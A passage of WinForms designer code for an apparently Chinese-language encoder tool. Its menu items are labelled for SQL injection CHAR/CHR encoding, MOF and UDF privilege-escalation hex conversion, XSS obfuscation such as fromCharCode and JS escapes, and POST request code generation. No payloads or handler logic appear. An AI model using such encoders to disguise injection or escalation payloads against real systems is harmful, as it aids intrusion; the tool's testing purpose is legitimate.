            this.hex编码UTF8ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.hex编码UTF8ToolStripMenuItem.Text = "Hex编码(UTF-8)";
            this.hex编码UTF8ToolStripMenuItem.Click += new System.EventHandler(this.hex编码UTF8ToolStripMenuItem_Click);
            // 
            // hex编码UnicodeToolStripMenuItem
            // 
            this.hex编码UnicodeToolStripMenuItem.Name = "hex编码UnicodeToolStripMenuItem";
            this.hex编码UnicodeToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.hex编码UnicodeToolStripMenuItem.Text = "Hex编码(Unicode)";
            this.hex编码UnicodeToolStripMenuItem.Click += new System.EventHandler(this.hex编码UnicodeToolStripMenuItem_Click);
            // 
            // 以上算法全使用ToolStripMenuItem1
            // 
            this.以上算法全使用ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全使用ToolStripMenuItem1.Image")));
            this.以上算法全使用ToolStripMenuItem1.Name = "以上算法全使用ToolStripMenuItem1";
            this.以上算法全使用ToolStripMenuItem1.Size = new System.Drawing.Size(166, 22);
            this.以上算法全使用ToolStripMenuItem1.Text = "以上算法全使用";
            this.以上算法全使用ToolStripMenuItem1.Click += new System.EventHandler(this.以上算法全使用ToolStripMenuItem1_Click);
            // 
            // toolStripMenuItem54
            // 
            this.toolStripMenuItem54.Name = "toolStripMenuItem54";
            this.toolStripMenuItem54.Size = new System.Drawing.Size(163, 6);
            // 
            // hex解码ToolStripMenuItem
            // 
            this.hex解码ToolStripMenuItem.Name = "hex解码ToolStripMenuItem";
            this.hex解码ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.hex解码ToolStripMenuItem.Text = "Hex解码(GB2312)";
            this.hex解码ToolStripMenuItem.Click += new System.EventHandler(this.hex解码ToolStripMenuItem_Click);
            // 
            // hex解码UTF8ToolStripMenuItem
            // 
            this.hex解码UTF8ToolStripMenuItem.Name = "hex解码UTF8ToolStripMenuItem";
            this.hex解码UTF8ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.hex解码UTF8ToolStripMenuItem.Text = "Hex解码(UTF-8)";
            this.hex解码UTF8ToolStripMenuItem.Click += new System.EventHandler(this.hex解码UTF8ToolStripMenuItem_Click);
            // 
            // hex解码UnicodeToolStripMenuItem
            // 
            this.hex解码UnicodeToolStripMenuItem.Name = "hex解码UnicodeToolStripMenuItem";
            this.hex解码UnicodeToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.hex解码UnicodeToolStripMenuItem.Text = "Hex解码(Unicode)";
            this.hex解码UnicodeToolStripMenuItem.Click += new System.EventHandler(this.hex解码UnicodeToolStripMenuItem_Click);
            // 
            // toolStripMenuItem53
            // 
            this.toolStripMenuItem53.Name = "toolStripMenuItem53";
            this.toolStripMenuItem53.Size = new System.Drawing.Size(163, 6);
            // 
            // aSCII码ToolStripMenuItem
            // 
            this.aSCII码ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem38,
            this.string2AsciiToolStripMenuItem,
            this.aSCII码转字符串ToolStripMenuItem,
            this.aSCII码之和ToolStripMenuItem,
            this.toolStripMenuItem37,
            this.转成PHPCHR字符串点号ToolStripMenuItem,
            this.pHPCHR字符串ToolStripMenuItem,
            this.pHPCHR字符串反转ToolStripMenuItem});
            this.aSCII码ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("aSCII码ToolStripMenuItem.Image")));
            this.aSCII码ToolStripMenuItem.Name = "aSCII码ToolStripMenuItem";
            this.aSCII码ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.aSCII码ToolStripMenuItem.Text = "ASCII码";
            // 
            // toolStripMenuItem38
            // 
            this.toolStripMenuItem38.Name = "toolStripMenuItem38";
            this.toolStripMenuItem38.Size = new System.Drawing.Size(205, 6);
            // 
            // string2AsciiToolStripMenuItem
            // 
            this.string2AsciiToolStripMenuItem.Name = "string2AsciiToolStripMenuItem";
            this.string2AsciiToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.string2AsciiToolStripMenuItem.Text = "字符串→ASCII码";
            this.string2AsciiToolStripMenuItem.Click += new System.EventHandler(this.string2AsciiToolStripMenuItem_Click);
            // 
            // aSCII码转字符串ToolStripMenuItem
            // 
            this.aSCII码转字符串ToolStripMenuItem.Name = "aSCII码转字符串ToolStripMenuItem";
            this.aSCII码转字符串ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.aSCII码转字符串ToolStripMenuItem.Text = "ASCII码→字符串";
            this.aSCII码转字符串ToolStripMenuItem.Click += new System.EventHandler(this.aSCII码转字符串ToolStripMenuItem_Click);
            // 
            // aSCII码之和ToolStripMenuItem
            // 
            this.aSCII码之和ToolStripMenuItem.Name = "aSCII码之和ToolStripMenuItem";
            this.aSCII码之和ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.aSCII码之和ToolStripMenuItem.Text = "ASCII码之和";
            this.aSCII码之和ToolStripMenuItem.Click += new System.EventHandler(this.aSCII码之和ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem37
            // 
            this.toolStripMenuItem37.Name = "toolStripMenuItem37";
            this.toolStripMenuItem37.Size = new System.Drawing.Size(205, 6);
            // 
            // 转成PHPCHR字符串点号ToolStripMenuItem
            // 
            this.转成PHPCHR字符串点号ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成PHPCHR字符串点号ToolStripMenuItem.Image")));
            this.转成PHPCHR字符串点号ToolStripMenuItem.Name = "转成PHPCHR字符串点号ToolStripMenuItem";
            this.转成PHPCHR字符串点号ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.转成PHPCHR字符串点号ToolStripMenuItem.Text = "转成PHP-CHR字符串(加号)";
            this.转成PHPCHR字符串点号ToolStripMenuItem.Click += new System.EventHandler(this.转成PHPCHR字符串点号ToolStripMenuItem_Click);
            // 
            // pHPCHR字符串ToolStripMenuItem
            // 
            this.pHPCHR字符串ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pHPCHR字符串ToolStripMenuItem.Image")));
            this.pHPCHR字符串ToolStripMenuItem.Name = "pHPCHR字符串ToolStripMenuItem";
            this.pHPCHR字符串ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.pHPCHR字符串ToolStripMenuItem.Text = "转成PHP-CHR字符串(点号)";
            this.pHPCHR字符串ToolStripMenuItem.Click += new System.EventHandler(this.pHPCHR字符串ToolStripMenuItem_Click);
            // 
            // pHPCHR字符串反转ToolStripMenuItem
            // 
            this.pHPCHR字符串反转ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pHPCHR字符串反转ToolStripMenuItem.Image")));
            this.pHPCHR字符串反转ToolStripMenuItem.Name = "pHPCHR字符串反转ToolStripMenuItem";
            this.pHPCHR字符串反转ToolStripMenuItem.Size = new System.Drawing.Size(208, 22);
            this.pHPCHR字符串反转ToolStripMenuItem.Text = "PHP-CHR字符串反转";
            this.pHPCHR字符串反转ToolStripMenuItem.Click += new System.EventHandler(this.pHPCHR字符串反转ToolStripMenuItem_Click);
            // 
            // sQLToolStripMenuItem
            // 
            this.sQLToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem36,
            this.oracleCHRToolStripMenuItem,
            this.mSSQLCHARToolStripMenuItem,
            this.mYSQLCHARToolStripMenuItem,
            this.mYSQLCHAR2ToolStripMenuItem,
            this.以上算法全使用ToolStripMenuItem2,
            this.toolStripMenuItem16,
            this.oracleCHRDecodeToolStripMenuItem,
            this.mSSQLCHARDecodeToolStripMenuItem,
            this.mysqlCHAR1DecodeToolStripMenuItem,
            this.mysqlCHAR2DecodeToolStripMenuItem,
            this.toolStripMenuItem15,
            this.mOF提权HexToolStripMenuItem,
            this.uDF提权HexToolStripMenuItem,
            this.mOF提权CHRToolStripMenuItem,
            this.uDF提权CHRToolStripMenuItem,
            this.toolStripMenuItem27,
            this.hEX文件路径1ToolStripMenuItem,
            this.hEX文件路径2ToolStripMenuItem,
            this.toolStripMenuItem26});
            this.sQLToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("sQLToolStripMenuItem.Image")));
            this.sQLToolStripMenuItem.Name = "sQLToolStripMenuItem";
            this.sQLToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.sQLToolStripMenuItem.Text = "SQL注入";
            // 
            // toolStripMenuItem36
            // 
            this.toolStripMenuItem36.Name = "toolStripMenuItem36";
            this.toolStripMenuItem36.Size = new System.Drawing.Size(193, 6);
            // 
            // oracleCHRToolStripMenuItem
            // 
            this.oracleCHRToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("oracleCHRToolStripMenuItem.Image")));
            this.oracleCHRToolStripMenuItem.Name = "oracleCHRToolStripMenuItem";
            this.oracleCHRToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.oracleCHRToolStripMenuItem.Text = "Oracle_CHR()";
            this.oracleCHRToolStripMenuItem.Click += new System.EventHandler(this.oracleCHRToolStripMenuItem_Click);
            // 
            // mSSQLCHARToolStripMenuItem
            // 
            this.mSSQLCHARToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mSSQLCHARToolStripMenuItem.Image")));
            this.mSSQLCHARToolStripMenuItem.Name = "mSSQLCHARToolStripMenuItem";
            this.mSSQLCHARToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mSSQLCHARToolStripMenuItem.Text = "MSSQL_CHAR()";
            this.mSSQLCHARToolStripMenuItem.Click += new System.EventHandler(this.mSSQLCHARToolStripMenuItem_Click);
            // 
            // mYSQLCHARToolStripMenuItem
            // 
            this.mYSQLCHARToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mYSQLCHARToolStripMenuItem.Image")));
            this.mYSQLCHARToolStripMenuItem.Name = "mYSQLCHARToolStripMenuItem";
            this.mYSQLCHARToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mYSQLCHARToolStripMenuItem.Text = "Mysql_CHAR()-1";
            this.mYSQLCHARToolStripMenuItem.Click += new System.EventHandler(this.mYSQLCHARToolStripMenuItem_Click);
            // 
            // mYSQLCHAR2ToolStripMenuItem
            // 
            this.mYSQLCHAR2ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mYSQLCHAR2ToolStripMenuItem.Image")));
            this.mYSQLCHAR2ToolStripMenuItem.Name = "mYSQLCHAR2ToolStripMenuItem";
            this.mYSQLCHAR2ToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mYSQLCHAR2ToolStripMenuItem.Text = "Mysql_CHAR()-2";
            this.mYSQLCHAR2ToolStripMenuItem.Click += new System.EventHandler(this.mYSQLCHAR2ToolStripMenuItem_Click);
            // 
            // 以上算法全使用ToolStripMenuItem2
            // 
            this.以上算法全使用ToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全使用ToolStripMenuItem2.Image")));
            this.以上算法全使用ToolStripMenuItem2.Name = "以上算法全使用ToolStripMenuItem2";
            this.以上算法全使用ToolStripMenuItem2.Size = new System.Drawing.Size(196, 22);
            this.以上算法全使用ToolStripMenuItem2.Text = "以上算法全使用";
            this.以上算法全使用ToolStripMenuItem2.Click += new System.EventHandler(this.以上算法全使用ToolStripMenuItem2_Click);
            // 
            // toolStripMenuItem16
            // 
            this.toolStripMenuItem16.Name = "toolStripMenuItem16";
            this.toolStripMenuItem16.Size = new System.Drawing.Size(193, 6);
            // 
            // oracleCHRDecodeToolStripMenuItem
            // 
            this.oracleCHRDecodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("oracleCHRDecodeToolStripMenuItem.Image")));
            this.oracleCHRDecodeToolStripMenuItem.Name = "oracleCHRDecodeToolStripMenuItem";
            this.oracleCHRDecodeToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.oracleCHRDecodeToolStripMenuItem.Text = "Oracle_CHR()-Decode";
            this.oracleCHRDecodeToolStripMenuItem.Click += new System.EventHandler(this.oracleCHRDecodeToolStripMenuItem_Click);
            // 
            // mSSQLCHARDecodeToolStripMenuItem
            // 
            this.mSSQLCHARDecodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mSSQLCHARDecodeToolStripMenuItem.Image")));
            this.mSSQLCHARDecodeToolStripMenuItem.Name = "mSSQLCHARDecodeToolStripMenuItem";
            this.mSSQLCHARDecodeToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mSSQLCHARDecodeToolStripMenuItem.Text = "MSSQL_CHAR()-Decode";
            this.mSSQLCHARDecodeToolStripMenuItem.Click += new System.EventHandler(this.mSSQLCHARDecodeToolStripMenuItem_Click);
            // 
            // mysqlCHAR1DecodeToolStripMenuItem
            // 
            this.mysqlCHAR1DecodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mysqlCHAR1DecodeToolStripMenuItem.Image")));
            this.mysqlCHAR1DecodeToolStripMenuItem.Name = "mysqlCHAR1DecodeToolStripMenuItem";
            this.mysqlCHAR1DecodeToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mysqlCHAR1DecodeToolStripMenuItem.Text = "Mysql_CHAR()-1-Decode";
            this.mysqlCHAR1DecodeToolStripMenuItem.Click += new System.EventHandler(this.mysqlCHAR1DecodeToolStripMenuItem_Click);
            // 
            // mysqlCHAR2DecodeToolStripMenuItem
            // 
            this.mysqlCHAR2DecodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mysqlCHAR2DecodeToolStripMenuItem.Image")));
            this.mysqlCHAR2DecodeToolStripMenuItem.Name = "mysqlCHAR2DecodeToolStripMenuItem";
            this.mysqlCHAR2DecodeToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mysqlCHAR2DecodeToolStripMenuItem.Text = "Mysql_CHAR()-2-Decode";
            this.mysqlCHAR2DecodeToolStripMenuItem.Click += new System.EventHandler(this.mysqlCHAR2DecodeToolStripMenuItem_Click);
            // 
            // toolStripMenuItem15
            // 
            this.toolStripMenuItem15.Name = "toolStripMenuItem15";
            this.toolStripMenuItem15.Size = new System.Drawing.Size(193, 6);
            // 
            // mOF提权HexToolStripMenuItem
            // 
            this.mOF提权HexToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mOF提权HexToolStripMenuItem.Image")));
            this.mOF提权HexToolStripMenuItem.Name = "mOF提权HexToolStripMenuItem";
            this.mOF提权HexToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mOF提权HexToolStripMenuItem.Text = "MOF提权→Hex";
            this.mOF提权HexToolStripMenuItem.Click += new System.EventHandler(this.mOF提权HexToolStripMenuItem_Click);
            // 
            // uDF提权HexToolStripMenuItem
            // 
            this.uDF提权HexToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uDF提权HexToolStripMenuItem.Image")));
            this.uDF提权HexToolStripMenuItem.Name = "uDF提权HexToolStripMenuItem";
            this.uDF提权HexToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.uDF提权HexToolStripMenuItem.Text = "UDF提权→Hex";
            this.uDF提权HexToolStripMenuItem.Click += new System.EventHandler(this.uDF提权HexToolStripMenuItem_Click);
            // 
            // mOF提权CHRToolStripMenuItem
            // 
            this.mOF提权CHRToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mOF提权CHRToolStripMenuItem.Image")));
            this.mOF提权CHRToolStripMenuItem.Name = "mOF提权CHRToolStripMenuItem";
            this.mOF提权CHRToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.mOF提权CHRToolStripMenuItem.Text = "MOF提权→CHR";
            this.mOF提权CHRToolStripMenuItem.Click += new System.EventHandler(this.mOF提权CHRToolStripMenuItem_Click);
            // 
            // uDF提权CHRToolStripMenuItem
            // 
            this.uDF提权CHRToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uDF提权CHRToolStripMenuItem.Image")));
            this.uDF提权CHRToolStripMenuItem.Name = "uDF提权CHRToolStripMenuItem";
            this.uDF提权CHRToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.uDF提权CHRToolStripMenuItem.Text = "UDF提权→CHR";
            this.uDF提权CHRToolStripMenuItem.Click += new System.EventHandler(this.uDF提权CHRToolStripMenuItem_Click);
            // 
            // toolStripMenuItem27
            // 
            this.toolStripMenuItem27.Name = "toolStripMenuItem27";
            this.toolStripMenuItem27.Size = new System.Drawing.Size(193, 6);
            // 
            // hEX文件路径1ToolStripMenuItem
            // 
            this.hEX文件路径1ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hEX文件路径1ToolStripMenuItem.Image")));
            this.hEX文件路径1ToolStripMenuItem.Name = "hEX文件路径1ToolStripMenuItem";
            this.hEX文件路径1ToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.hEX文件路径1ToolStripMenuItem.Text = "HEX文件路径(MSSQL)";
            this.hEX文件路径1ToolStripMenuItem.Click += new System.EventHandler(this.hEX文件路径1ToolStripMenuItem_Click);
            // 
            // hEX文件路径2ToolStripMenuItem
            // 
            this.hEX文件路径2ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hEX文件路径2ToolStripMenuItem.Image")));
            this.hEX文件路径2ToolStripMenuItem.Name = "hEX文件路径2ToolStripMenuItem";
            this.hEX文件路径2ToolStripMenuItem.Size = new System.Drawing.Size(196, 22);
            this.hEX文件路径2ToolStripMenuItem.Text = "HEX文件路径(Mysql)";
            this.hEX文件路径2ToolStripMenuItem.Click += new System.EventHandler(this.hEX文件路径2ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem26
            // 
            this.toolStripMenuItem26.Name = "toolStripMenuItem26";
            this.toolStripMenuItem26.Size = new System.Drawing.Size(193, 6);
            // 
            // xSSToolStripMenuItem
            // 
            this.xSSToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem45,
            this.fromCharCodeToolStripMenuItem,
            this.hTML实体DecToolStripMenuItem,
            this.hTML实体HexToolStripMenuItem,
            this.hTML实体UTF8ToolStripMenuItem,
            this.以上算法全使用ToolStripMenuItem3,
            this.toolStripMenuItem30,
            this.jSHexStringToolStripMenuItem,
            this.jSUnicodeToolStripMenuItem,
            this.jSEscapeToolStripMenuItem,
            this.jSEscapeALLToolStripMenuItem,
            this.以上算法全使用ToolStripMenuItem4,
            this.toolStripMenuItem31,
            this.中文UnicodeToolStripMenuItem,
            this.unicode中文ToolStripMenuItem,
            this.toolStripMenuItem46});
            this.xSSToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("xSSToolStripMenuItem.Image")));
            this.xSSToolStripMenuItem.Name = "xSSToolStripMenuItem";
            this.xSSToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.xSSToolStripMenuItem.Text = "XSS跨站";
            // 
            // toolStripMenuItem45
            // 
            this.toolStripMenuItem45.Name = "toolStripMenuItem45";
            this.toolStripMenuItem45.Size = new System.Drawing.Size(151, 6);
            // 
            // fromCharCodeToolStripMenuItem
            // 
            this.fromCharCodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fromCharCodeToolStripMenuItem.Image")));
            this.fromCharCodeToolStripMenuItem.Name = "fromCharCodeToolStripMenuItem";
            this.fromCharCodeToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.fromCharCodeToolStripMenuItem.Text = "FromCharCode";
            this.fromCharCodeToolStripMenuItem.Click += new System.EventHandler(this.fromCharCodeToolStripMenuItem_Click);
            // 
            // hTML实体DecToolStripMenuItem
            // 
            this.hTML实体DecToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hTML实体DecToolStripMenuItem.Image")));
            this.hTML实体DecToolStripMenuItem.Name = "hTML实体DecToolStripMenuItem";
            this.hTML实体DecToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.hTML实体DecToolStripMenuItem.Text = "HTML实体(Dec)";
            this.hTML实体DecToolStripMenuItem.Click += new System.EventHandler(this.hTML实体DecToolStripMenuItem_Click);
            // 
            // hTML实体HexToolStripMenuItem
            // 
            this.hTML实体HexToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hTML实体HexToolStripMenuItem.Image")));
            this.hTML实体HexToolStripMenuItem.Name = "hTML实体HexToolStripMenuItem";
            this.hTML实体HexToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.hTML实体HexToolStripMenuItem.Text = "HTML实体(Hex)";
            this.hTML实体HexToolStripMenuItem.Click += new System.EventHandler(this.hTML实体HexToolStripMenuItem_Click);
            // 
            // hTML实体UTF8ToolStripMenuItem
            // 
            this.hTML实体UTF8ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hTML实体UTF8ToolStripMenuItem.Image")));
            this.hTML实体UTF8ToolStripMenuItem.Name = "hTML实体UTF8ToolStripMenuItem";
            this.hTML实体UTF8ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.hTML实体UTF8ToolStripMenuItem.Text = "HTML实体(UTF8)";
            this.hTML实体UTF8ToolStripMenuItem.Visible = false;
            this.hTML实体UTF8ToolStripMenuItem.Click += new System.EventHandler(this.hTML实体UTF8ToolStripMenuItem_Click);
            // 
            // 以上算法全使用ToolStripMenuItem3
            // 
            this.以上算法全使用ToolStripMenuItem3.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全使用ToolStripMenuItem3.Image")));
            this.以上算法全使用ToolStripMenuItem3.Name = "以上算法全使用ToolStripMenuItem3";
            this.以上算法全使用ToolStripMenuItem3.Size = new System.Drawing.Size(154, 22);
            this.以上算法全使用ToolStripMenuItem3.Text = "以上算法全使用";
            this.以上算法全使用ToolStripMenuItem3.Click += new System.EventHandler(this.以上算法全使用ToolStripMenuItem3_Click);
            // 
            // toolStripMenuItem30
            // 
            this.toolStripMenuItem30.Name = "toolStripMenuItem30";
            this.toolStripMenuItem30.Size = new System.Drawing.Size(151, 6);
            // 
            // jSHexStringToolStripMenuItem
            // 
            this.jSHexStringToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jSHexStringToolStripMenuItem.Image")));
            this.jSHexStringToolStripMenuItem.Name = "jSHexStringToolStripMenuItem";
            this.jSHexStringToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.jSHexStringToolStripMenuItem.Text = "JS_Hex_String";
            this.jSHexStringToolStripMenuItem.Click += new System.EventHandler(this.jSHexStringToolStripMenuItem_Click);
            // 
            // jSUnicodeToolStripMenuItem
            // 
            this.jSUnicodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jSUnicodeToolStripMenuItem.Image")));
            this.jSUnicodeToolStripMenuItem.Name = "jSUnicodeToolStripMenuItem";
            this.jSUnicodeToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.jSUnicodeToolStripMenuItem.Text = "JS_Unicode";
            this.jSUnicodeToolStripMenuItem.Click += new System.EventHandler(this.jSUnicodeToolStripMenuItem_Click);
            // 
            // jSEscapeToolStripMenuItem
            // 
            this.jSEscapeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jSEscapeToolStripMenuItem.Image")));
            this.jSEscapeToolStripMenuItem.Name = "jSEscapeToolStripMenuItem";
            this.jSEscapeToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.jSEscapeToolStripMenuItem.Text = "JS_Escape";
            this.jSEscapeToolStripMenuItem.Click += new System.EventHandler(this.jSEscapeToolStripMenuItem_Click);
            // 
            // jSEscapeALLToolStripMenuItem
            // 
            this.jSEscapeALLToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jSEscapeALLToolStripMenuItem.Image")));
            this.jSEscapeALLToolStripMenuItem.Name = "jSEscapeALLToolStripMenuItem";
            this.jSEscapeALLToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.jSEscapeALLToolStripMenuItem.Text = "JS_Escape_ALL";
            this.jSEscapeALLToolStripMenuItem.Click += new System.EventHandler(this.jSEscapeALLToolStripMenuItem_Click);
            // 
            // 以上算法全使用ToolStripMenuItem4
            // 
            this.以上算法全使用ToolStripMenuItem4.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全使用ToolStripMenuItem4.Image")));
            this.以上算法全使用ToolStripMenuItem4.Name = "以上算法全使用ToolStripMenuItem4";
            this.以上算法全使用ToolStripMenuItem4.Size = new System.Drawing.Size(154, 22);
            this.以上算法全使用ToolStripMenuItem4.Text = "以上算法全使用";
            this.以上算法全使用ToolStripMenuItem4.Click += new System.EventHandler(this.以上算法全使用ToolStripMenuItem4_Click);
            // 
            // toolStripMenuItem31
            // 
            this.toolStripMenuItem31.Name = "toolStripMenuItem31";
            this.toolStripMenuItem31.Size = new System.Drawing.Size(151, 6);
            // 
            // 中文UnicodeToolStripMenuItem
            // 
            this.中文UnicodeToolStripMenuItem.Name = "中文UnicodeToolStripMenuItem";
            this.中文UnicodeToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.中文UnicodeToolStripMenuItem.Text = "中文-Unicode";
            this.中文UnicodeToolStripMenuItem.Click += new System.EventHandler(this.中文UnicodeToolStripMenuItem_Click);
            // 
            // unicode中文ToolStripMenuItem
            // 
            this.unicode中文ToolStripMenuItem.Name = "unicode中文ToolStripMenuItem";
            this.unicode中文ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.unicode中文ToolStripMenuItem.Text = "Unicode→中文";
            this.unicode中文ToolStripMenuItem.Click += new System.EventHandler(this.unicode中文ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem46
            // 
            this.toolStripMenuItem46.Name = "toolStripMenuItem46";
            this.toolStripMenuItem46.Size = new System.Drawing.Size(151, 6);
            // 
            // http提交ToolStripMenuItem
            // 
            this.http提交ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.提交代码ToolStripMenuItem,
            this.jQueryPost代码post参数ToolStripMenuItem,
            this.flashAS脚本Post提交post参数ToolStripMenuItem,
            this.pythonPost提交代码ToolStripMenuItem,
            this.pHPPost提交代码post参数ToolStripMenuItem,
            this.perlPost提交代码post参数ToolStripMenuItem,
            this.正转ToolStripMenuItem,
            this.jQueryPost代码post参数ToolStripMenuItem1,
            this.post参数FlashPost参数ToolStripMenuItem,
            this.post参数PythonPost参数ToolStripMenuItem,
            this.post参数PHPPost参数ToolStripMenuItem,
            this.反转ToolStripMenuItem,
            this.post参数JQueryPost参数ToolStripMenuItem,
            this.jQueryPost参数Post参数ToolStripMenuItem,
            this.pythonPost参数Post参数ToolStripMenuItem,
            this.pHPPost参数Post参数ToolStripMenuItem,
            this.toolStripMenuItem63});
            this.http提交ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("http提交ToolStripMenuItem.Image")));
            this.http提交ToolStripMenuItem.Name = "http提交ToolStripMenuItem";
            this.http提交ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.http提交ToolStripMenuItem.Text = "Web提交";
            // 
            // 提交代码ToolStripMenuItem
            // 
            this.提交代码ToolStripMenuItem.Name = "提交代码ToolStripMenuItem";
            this.提交代码ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.提交代码ToolStripMenuItem.Text = "------------提交代码-----------";
            // 
            // jQueryPost代码post参数ToolStripMenuItem
            // 
            this.jQueryPost代码post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("jQueryPost代码post参数ToolStripMenuItem.Image")));
            this.jQueryPost代码post参数ToolStripMenuItem.Name = "jQueryPost代码post参数ToolStripMenuItem";
            this.jQueryPost代码post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.jQueryPost代码post参数ToolStripMenuItem.Text = "jQuery Post提交代码(post参数)";
            this.jQueryPost代码post参数ToolStripMenuItem.Click += new System.EventHandler(this.jQueryPost代码post参数ToolStripMenuItem_Click);
            // 
            // flashAS脚本Post提交post参数ToolStripMenuItem
            // 
            this.flashAS脚本Post提交post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("flashAS脚本Post提交post参数ToolStripMenuItem.Image")));
            this.flashAS脚本Post提交post参数ToolStripMenuItem.Name = "flashAS脚本Post提交post参数ToolStripMenuItem";
            this.flashAS脚本Post提交post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.flashAS脚本Post提交post参数ToolStripMenuItem.Text = "Flash Post提交代码(post参数)";
            this.flashAS脚本Post提交post参数ToolStripMenuItem.Click += new System.EventHandler(this.flashAS脚本Post提交post参数ToolStripMenuItem_Click);
            // 
            // pythonPost提交代码ToolStripMenuItem
            // 
            this.pythonPost提交代码ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pythonPost提交代码ToolStripMenuItem.Image")));
            this.pythonPost提交代码ToolStripMenuItem.Name = "pythonPost提交代码ToolStripMenuItem";
            this.pythonPost提交代码ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.pythonPost提交代码ToolStripMenuItem.Text = "Python Post提交代码(post参数)";
            this.pythonPost提交代码ToolStripMenuItem.Click += new System.EventHandler(this.pythonPost提交代码ToolStripMenuItem_Click);
            // 
            // pHPPost提交代码post参数ToolStripMenuItem
            // 
            this.pHPPost提交代码post参数ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("pHPPost提交代码post参数ToolStripMenuItem.Image")));
            this.pHPPost提交代码post参数ToolStripMenuItem.Name = "pHPPost提交代码post参数ToolStripMenuItem";
            this.pHPPost提交代码post参数ToolStripMenuItem.Size = new System.Drawing.Size(256, 22);
            this.pHPPost提交代码post参数ToolStripMenuItem.Text = "PHP Post提交代码(post参数)";
